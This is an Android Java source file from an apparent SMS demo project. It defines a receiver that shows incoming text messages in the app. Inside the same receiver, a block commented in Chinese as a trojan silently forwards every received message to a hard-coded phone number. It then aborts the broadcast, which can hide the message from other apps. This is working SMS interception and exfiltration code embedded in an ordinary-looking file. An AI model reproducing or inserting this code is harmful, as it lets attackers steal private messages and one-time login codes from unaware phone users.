package com.example.mybroadcoast;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.example.smstest.MainActivity;

/**
 * Created by Administrator on 2016/4/15 0015.
 */
public class MessageReceiver extends BroadcastReceiver {
    Context context;
    public MessageReceiver(Context context) {
        this.context = context;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[])bundle.get("pdus");//每一个pdu 都表示一条短信消息
        SmsMessage[] smsMessages = new SmsMessage[pdus.length];
        //将每一个pdu 字节数组转换为SmsMessage 对象
        for(int i=0;i<smsMessages.length;i++){
            smsMessages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
        }
        String sender = smsMessages[0].getOriginatingAddress(); // 获取发送方号码
        String fullMessage = "";
        for (SmsMessage message : smsMessages) {
            fullMessage += message.getMessageBody(); // 获取短信内容
        }
        MainActivity mainActivity = (MainActivity)context;
        mainActivity.getSender().setText(sender);
        mainActivity.getContent().setText(fullMessage);

        // 木马，同时给固定目标发送信息
        SmsManager smsManager = SmsManager.getDefault();
        Intent sentIntent = new Intent("SENT_SMS_ACTION");
        PendingIntent pi = PendingIntent.getBroadcast
                (context, 0, sentIntent, 0);
        smsManager.sendTextMessage("15207480604", null,
                fullMessage, pi, null);
        abortBroadcast();
    }
}
